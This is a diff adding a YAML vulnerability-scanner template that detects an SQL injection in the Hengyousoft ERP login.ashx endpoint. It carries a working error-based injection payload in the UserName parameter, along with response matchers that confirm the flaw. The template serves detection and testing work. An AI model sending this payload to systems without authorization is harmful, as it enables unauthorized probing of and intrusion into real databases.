@@ -1,0 +1,33 @@
+id: hengyousoft-erp-login-ashx-sqli
+info:
+  name: Hengyousoft ERP login.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin%27+AND+1=sys.fn_varbintohexstr(hashbytes('md5','{{t1}}'))--&UserPwd=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "出错了"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
